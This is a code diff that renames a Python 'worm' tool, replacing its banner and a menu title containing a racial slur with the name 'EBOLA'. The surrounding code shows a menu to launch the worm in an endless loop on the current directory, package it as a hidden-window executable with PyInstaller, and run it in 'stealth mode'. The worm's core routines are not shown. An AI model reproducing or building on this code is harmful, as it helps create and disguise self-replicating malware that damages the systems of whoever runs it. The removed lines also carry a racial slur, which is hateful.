@@ -21,13 +21,11 @@ def prBlack(skk): print("\033[98m {}\033[00m" .format(skk))
 #function to print banner
 def banner_func():
 	prCyan ("""
-	                 _____     _   _         _   _ _                       
-			|  ___|_ _| |_| |_ _   _| \ | (_) __ _  __ _  ___ _ __ 
-			| |_ / _` | __| __| | | |  \| | |/ _` |/ _` |/ _ \ '__|
-			|  _| (_| | |_| |_| |_| | |\  | | (_| | (_| |  __/ |   
-			|_|  \__,_|\__|\__|\__, |_| \_|_|\__, |\__, |\___|_|   
-         			           |___/         |___/ |___/           
-                                                        PYTHON WORM! """)
+         ____        _
+     ___| __ )  ___ | |    __ _
+    / _ \  _ \ / _ \| |   / _` |
+    |  __/ |_) | (_) | |__| (_| |
+    \___|____/ \___/|_____\__,_| """)
 
 #class containing worm code
 class Worm:
@@ -104,16 +102,16 @@ class Worm:
 def execute_worm():
 	print('[!] Press [Ctrl] + [C] to Stop!')
 	while True:
-    		current_directory = os.path.abspath("")
-    		worm = Worm(path=current_directory)
-    		worm.start_worm_actions()
+            current_directory = os.path.abspath("")
+            worm=Worm(path=current_directory)
+            worm.start_worm_actions()
     			  
 
 
 #menu function of worm
 def worm_menu():
 	prPurple(' --------------------------------- ')
-	prPurple('|      F A T T Y N I G G E R      |')
+	prPurple('|      E   B   O   L    A         |')
 	prPurple(' --------------------------------- ')
 	prPurple('| [+] 1 => Launch Worm!           |')
 	prPurple('| [+] 2 => Make It Executable!    |')
@@ -142,7 +140,7 @@ if __name__=="__main__":
 		
 		#operation to perform
 		if opt == 1:
-			prRed('[!] WORM FattyNigger Started!')
+			prRed('[!] EBLOA WORM Started!')
 			try:
 				execute_worm()
 			except KeyboardInterrupt:
@@ -155,11 +153,11 @@ if __name__=="__main__":
 					continue
 				
 		elif opt == 2:
-			prGreen('[+] Creating EXE of WORM FattyNigger.py!')
+			prGreen('[+] Creating EXE of EBOLA WORM.py!')
 			time.sleep(2)
 			
-			os.system('pyinstaller fattynigger.py --onefile --noconsole')
-			prLightGray('[!] fattynigger.exe Created!')
+			os.system('pyinstaller ebola.py --onefile --noconsole')
+			prLightGray('[!] ebola.exe Created!')
 		
 		elif opt == 3:
 			prYellow('[!] Running Worm in Stealth Mode') 
